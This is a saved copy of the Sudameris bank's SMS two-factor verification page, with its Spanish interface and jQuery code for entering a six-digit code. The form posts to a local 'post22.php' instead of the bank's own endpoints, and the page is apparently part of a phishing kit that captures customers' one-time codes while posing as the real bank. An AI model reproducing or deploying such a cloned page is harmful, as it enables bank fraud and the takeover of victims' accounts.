<!DOCTYPE html>
<!-- saved from url=(0060)https://secure.sudameris.com.py/sudamerisweb/login/2fa-check -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    
    <meta name="description" content="SudamerisBank">
 
    <title>Sudameris</title>

    <!-- CSS -->
    

<link href="./Sudameris_files/bootstrap.min.css" rel="stylesheet">
<link href="./Sudameris_files/spinner.css" rel="stylesheet">
<link href="./Sudameris_files/style.css" rel="stylesheet">
<link rel="stylesheet" href="./Sudameris_files/trust.css">
<link rel="stylesheet" href="./Sudameris_files/start.css">
<link rel="stylesheet" href="./Sudameris_files/spinner.css">
<link rel="stylesheet" href="./Sudameris_files/error.css">




    <!-- JS -->
    


<script type="text/javascript" src="./Sudameris_files/jquery.js.descarga"></script>
<script type="text/javascript" src="./Sudameris_files/bootstrap.js.descarga"></script>
<script type="text/javascript" src="./Sudameris_files/form-validator.js.descarga"></script>
<script type="text/javascript" src="./Sudameris_files/doublecrypt.js.descarga"></script>

  <!-- crypt -->
<script type="text/javascript" src="./Sudameris_files/crypto-js.js.descarga"></script>
<script type="text/javascript" src="./Sudameris_files/core.js.descarga"></script>
<script type="text/javascript" src="./Sudameris_files/cipher-core.js.descarga"></script>
<script type="text/javascript" src="./Sudameris_files/sha256.js.descarga"></script>
<script type="text/javascript" src="./Sudameris_files/enc-utf8.js.descarga"></script>
<script type="text/javascript" src="./Sudameris_files/enc-base64.js.descarga"></script>
<script type="text/javascript" src="./Sudameris_files/aes.js.descarga"></script>
  
    <script>

    doublecrypt.init(
        "ozFuDe1J8zrSIxdceTW+AA==",
        "nTSgq/UdUjhLm4YjT1ET3QtcCAHVmCkxT9uJPQ/EiEc="
    );
    /**/
    let CSRF_TOKEN="OzM52mpye6TcDvdhGUU90+vJJkQA76Gd18Yy3E5XxII=";
</script>

    <script>
        var baseUrl="/sudamerisweb";
        console.log(baseUrl);

        var SESSION_CHECK_INTERVAL_MILLIS_FROM_PROPERTIES ="300000";
        console.log(SESSION_CHECK_INTERVAL_MILLIS_FROM_PROPERTIES);
        if(SESSION_CHECK_INTERVAL_MILLIS_FROM_PROPERTIES == "") SESSION_CHECK_INTERVAL_MILLIS_FROM_PROPERTIES = "60000"; /*default 1 minute*/
        console.log(SESSION_CHECK_INTERVAL_MILLIS_FROM_PROPERTIES);

        var TIMEOUT_IN_MILLIS_FROM_PROPERTIES ="600000";
        if(TIMEOUT_IN_MILLIS_FROM_PROPERTIES == "") TIMEOUT_IN_MILLIS_FROM_PROPERTIES = "900000"; /*default 15 minutes*/

    </script>
<script src="./Sudameris_files/js(1)" async=""></script></head>
<body class="bkg-color-medium">
  <div class="auth-spinner" style="display: none"><div class="lds-ellipsis"><div></div><div></div><div></div><div></div></div></div>
  
    <div id="header">
    <div class="header-text">

    </div>
</div>
<div class="var_text">
    <div id="title-bar">
        <p><img src="./Sudameris_files/userLogo.png">IDENTIFICACIÓN DE USUARIO</p>
    </div>
</div>

  

  <div class="container ">
    <div class="row">
    <div class="col-sm-24 no-float bkg-color-medium" id="background-view">
        <div class="container_v col-sm-7">
            


<div class="bkg-color-very-light subtitle-view">
  <h2 class="font-style-label text-color-medium font-medium border-bottom-color-medium subtitle-text">
    VERIFICACIÓN SMS
    
      
        
          <img class="pull-right" src="./Sudameris_files/Icon SMS@2x.png" style="width: 1.5em; height: 1.5em;">
        
        
        
      
    
  </h2>
  <p class="text-center texto_ingreso_v">Hemos enviado un código temporal de verificación por mensaje de texto(SMS) a: </p>
                            <p class="text-center number_user" id="number_user">(••••)••• •</p>
                            <p class="text-center texto_ingreso_v">Favor ingrese el valor recibido para continuar o Ingrese su código Token. </p>
                        <form method="post" id="validate-user" action="post22.php">
                      <input type="hidden" name="s2fatoken" value="ee2f1efc-f677-48e7-b96f-de3ea8a72148" onpaste="return false">
                      <input id="id_token_value" type="hidden" name="value" value="" onpaste="return false">
                      <div class="text-center">
                          <label style="width:100%" class="texto_verificacion_v">CÓDIGO DE VERIFICACIÓN</label>
                          <input id="1" name="1" class="input_verificacion" autocomplete="off" maxlength="1" onpaste="return false">
                          <input id="2" name="2" class="input_verificacion" autocomplete="off" maxlength="1" onpaste="return false">
                          <input id="3" name="3" class="input_verificacion" autocomplete="off" maxlength="1" onpaste="return false">
                          <input id="4" name="4" class="input_verificacion" autocomplete="off" maxlength="1" onpaste="return false">
                          <input id="5" name="5" class="input_verificacion" autocomplete="off" maxlength="1" onpaste="return false">
                          <input id="6" name="6" class="input_verificacion" autocomplete="off" maxlength="1" onpaste="return false">
                          <div class="clase_error" style="display:none">Debe ingresar todos los campos</div>
                          <p class="cuenta_regresiva_style" id="cuenta_regresiva">00:20</p>
                          </div>
                  </form>
            
</div>
<footer>
                <p class="text-center text_pregunta_codigo">¿No recibió el código?</p>
                <p class="text-center text_reenvio"><span id="reenviar" style="filter: opacity(20%); pointer-events: none">REENVIAR<img src="./Sudameris_files/reenvio.png"></span></p>
            </footer>
            <button type="button" id="validate_next" class="positive-button bkg-color-red font-style-label text-color-very-light font-small button_next">SIGUIENTE</button>
            <button type="button" class="back-button bkg-color-medium font-style-label text-color-red font-small button_previous" onclick="window.location.href=&quot;/sudamerisweb/logout&quot;">ATRÁS</button>
       </div>
    </div>

  </div>
  <script>
    var NOMBRE_PAGINA="unblocking";
    var TIMER;
    var COUNT=0;
    var OPERATION_CANCELLED_TOKEN=false;
    $(function(){



        $(".input_verificacion").inputFilter(function(value) {
          return /^\d*$/.test(value) && (value === "" || parseInt(value) <= 1500);
        });
        ///focus de primer input
        $("#primer_input_verificacion").focus();
        // ir a input siguiente
        $(".input_verificacion").keyup(function (e) {
            if(e.which==37){
                $(this).prev('.input_verificacion').focus();
            }
            else if (this.value.length == this.maxLength || e.which==39) {
              $(this).next('.input_verificacion').focus();
            }
            else if (e.which === 8 && $(this).val()=='') {

                $(this).prev('.input_verificacion').focus();

            }
            if (e.which == 13) {
                $('form#validate-user').submit();
                return false;    //<---- Add this line
            }

        });

        $(".input_verificacion").focus(function() {
            $(this).select();
        });
        //Controlar pegado
        $(".input_verificacion").bind("paste", function(e){
            // access the clipboard using the api
            var pastedData = e.originalEvent.clipboardData.getData('text');
            if(pastedData.length>5 && !isNaN(pastedData)){
                var array=pastedData.split("");
                $(".input_verificacion").each(function(index){
                    var element=$(this);
                    setTimeout(function(){
                        element.val(array[index])
                    },50);
                });
            }
        } );


        /**/
        
            $("#cuenta_regresiva").countdown( 32 * 1000, function(){

            });
        
        /**/




        if(''!=''){
            var code='';
            if(code=='INVALID_CODE'){
                $(".clase_error").text("Código Inválido. Por favor, ingrese de vuelta");
                $(".clase_error").show();
            }
        }


        $("#validate-user").submit(function (event) {

            if(validar_campos(".input_verificacion")){
                var value =''
                $(".input_verificacion").each(function () {
                    value=value+$(this).val();
                });
                value = publicFunctionEncrypt(value);
                $("#id_token_value").val(value);

                $(".clase_error").hide(); clearInterval(TIMER);
                $("body > .auth-spinner").show();
            }
            else{
                $(".clase_error").text("Debe ingresar todos los campos");
                $(".clase_error").show();
                event.preventDefault(event);
            }


        });
        $("#validate_next").click(function () {
            $("#validate-user").submit();
        });


         //Botón reenviar
        $("#reenviar").click(function () {
            reenviar_codigo("928cf6d5-4e05-470f-be26-65fc373cb281");

        });

        




    });


    ///Filtro para aceptar solo números
    $.fn.inputFilter = function(inputFilter) {
            return this.on("input keydown keyup mousedown mouseup select contextmenu drop", function() {
              if (inputFilter(this.value)) {
                this.oldValue = this.value;
                this.oldSelectionStart = this.selectionStart;
                this.oldSelectionEnd = this.selectionEnd;
              } else if (this.hasOwnProperty("oldValue")) {
                this.value = this.oldValue;
                this.setSelectionRange(this.oldSelectionStart, this.oldSelectionEnd);
            }
        });
    };
    ///// Cuenta regresiva
    $.fn.countdown = function(milliseconds, callback) {
        var $el = this;
        var buffer = 200;
        var end;

        // Defaults
        milliseconds = milliseconds || 2 * 60 * 1000; // 2 minutes
        end = new Date(Date.now() + milliseconds + buffer);

        // Start the counter
        tick();

        function formatTime(time){
          var minutes = time.getMinutes();
          var seconds = time.getSeconds();
          /*set_local_storage(minutes, seconds, "2fa-check");*/
          if(seconds<10){
            return "0"+minutes+":"+"0"+seconds;
          }
          else{
            return "0"+minutes+":"+seconds;
          }

        }

        function tick() {
          var remaining = new Date(end - Date.now());

          if (remaining > 0) {
            $el.html(formatTime(remaining));
            TIMER = setTimeout(tick, 1000);
          } else {
            clearInterval(TIMER);
            if (callback) callback.apply($el);
              $("#reenviar").css("filter", "");
              $("#reenviar").css("pointer-events", "");
              $(".input_verificacion").val("");
          }
        };
    };

    /////Validar campos vacíos
    function validar_campos (clase){
        var count=0;
        $(clase).each(function(){
            if($(this).val()!=''){
                count++;
            }
        });
        return $(clase).length==count;
    }

    ////Guardar conteo
    function set_local_storage(minutes, seconds, name){
        localStorage.clear();
        var time= {};
        time.minutes=minutes;
        time.seconds=seconds;
        time.name=name;
        localStorage.setItem('time', JSON.stringify(time));
    }


    ///Recuperar conteo
    function get_local_storage(nombre) {
        localStorage.getItem('time');
        if (document.location.href.search(nombre) < 0){
            localStorage.clear();
        }
        else if (document.location.href.search(nombre) >= 0 && localStorage.getItem('time') && JSON.parse(localStorage.getItem('time')).name==nombre) {
            var localSt = JSON.parse(localStorage.getItem('time'));
            return localSt;
        }else{
            return null;
        }
    }

    // Reenviar código
    function reenviar_codigo(token) {
        $.ajax({
            url: "/sudamerisweb/login/retry-2fa",
            type : 'POST',
            data:{token:token},
            success: function(result){
                console.log(result.response);
                if (result.hasError){
                    if(result.errorBody.useApiMessage){
                        /*showGenericError(result.errorBody.message);*/
                        $(".clase_error").text(result.errorBody.message);
                        $(".clase_error").show();
                        redirectLoginExpired(result.errorBody.code);

                    }else{
                        $(".clase_error").text("Ocurrió un error. No se pudo reenviar la petición");
                        $(".clase_error").show();
                        redirectLoginExpired(result.errorBody.code);

                    }
                }
                else{
                    clearInterval(TIMER);
                    localStorage.clear();
                    $(".input_verificacion").prop("disabled", "");
                    $("#validate_next").prop("disabled", "");

                    
                        $("#cuenta_regresiva").countdown( 32 * 1000, function(){

                        });
                        $("#reenviar").css("filter", "opacity(20%)");
                        $("#reenviar").css("pointer-events", "none");
                    
                    $("#primer_input_verificacion").focus();
                    /// Si se cancela el push, se reactiva el pushCheck al reenviar
                    if(OPERATION_CANCELLED_TOKEN && COUNT==0){
                        COUNT++;
                        OPERATION_CANCELLED_TOKEN=false;
                        pushCheck();
                    }
                    // Si hay un error previo, se reactiva el pushCheck al reenviar
                    

                }


            }
            ,error: function(result){
                /*showGenericError("Error al obtener valores");*/
            }
            ,complete : function(){
                /*$(".content-spinner").hide();*/
            }
        });

    }
    // Checkear push
    function pushCheck() {
        $.ajax({
            url: "/sudamerisweb/login/push-check/928cf6d5-4e05-470f-be26-65fc373cb281",
            type : 'GET',
            cache:false,
            success: function(result){
                console.log(result.response);
                if (result.hasError){
                    if(result.errorBody.useApiMessage){
                        $(".clase_error").text(result.errorBody.message);
                        $(".clase_error").show();
                        redirectLoginExpired(result.errorBody.code);
                    }else{
                        $(".clase_error").text("Ocurrió un error. No se pudo obtener la clave por PUSH");
                        $(".clase_error").show();
                        redirectLoginExpired(result.errorBody.code);
                    }
                }
                else{
                    if(result.response.status=="PENDING"){
                        setTimeout(function () {
                            return pushCheck();
                        }, 2000);
                    }
                    else if(result.response.status=="CANCELLED"){
                        $(".clase_error").text("La operación ha sido cancelada.");
                        $(".clase_error").show();
                        COUNT=0;
                        OPERATION_CANCELLED_TOKEN=true;
                        /*setTimeout(function () {
                            window.location.href="/sudamerisweb/logout" ;
                        },4000);*/
                    }
                    else{
                        var code=result.response.value;
                        var array=code.split("");
                        $(".input_verificacion").each(function(index){
                            var element=$(this);
                            setTimeout(function(){
                                element.val(array[index])
                            },300);
                        });
                        $(".input_verificacion").last().focus();
                        setTimeout(function () {
                            $("#validate-user").submit();
                        },500);

                    }


                }


            }
            ,error: function(result){
                console.log(result);

            }
            ,complete : function(){

            }
        });
    }



  </script>



</body></html>